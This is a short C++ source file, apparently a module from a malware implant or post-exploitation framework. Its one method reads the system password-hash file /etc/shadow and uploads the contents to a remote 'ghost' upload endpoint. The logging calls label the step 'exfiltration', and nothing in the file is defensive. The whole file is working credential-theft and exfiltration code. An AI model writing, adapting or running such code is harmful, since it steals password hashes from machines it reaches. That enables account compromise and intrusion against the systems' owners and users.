#include "modules/gathering/EtcShadow.hpp"
#include "utils/SystemUtils.hpp"
#include "utils/Logger.hpp"
#include "network/Comms.hpp"

bool EtcShadowMethod::trigger() {
    std::string data;
    
    LOG_INFO("Attempting /etc/shadow exfiltration")
    data += FileUtils::ReadFile("/etc/shadow");

    if (data.empty()) return false;

    // TODO: think about aggregating all info and sending in one request, this is highly inefficient
    LOG_INFO("Uploading /etc/shadow")
    return Comms::UploadFile("/api/v1/ghost/upload", "etc_shadow.txt", data);
}
